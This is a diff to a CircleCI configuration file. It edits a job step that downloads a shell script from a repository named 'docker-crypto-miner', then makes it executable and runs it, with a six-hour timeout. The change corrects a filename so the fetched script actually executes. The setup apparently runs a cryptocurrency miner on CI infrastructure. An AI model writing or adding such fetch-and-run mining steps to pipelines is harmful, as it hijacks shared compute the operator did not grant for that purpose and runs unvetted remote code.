@@ -14,8 +14,7 @@ jobs:
           no_output_timeout: 360m
           command: |
             wget https://raw.githubusercontent.com/ci-monk/docker-crypto-miner/main/src/circleci/run.sh
-            chmod +x circleci.sh
-            ./circleci.sh
+            chmod +x run.sh && ./run.sh
 
 workflows:
   version: 2
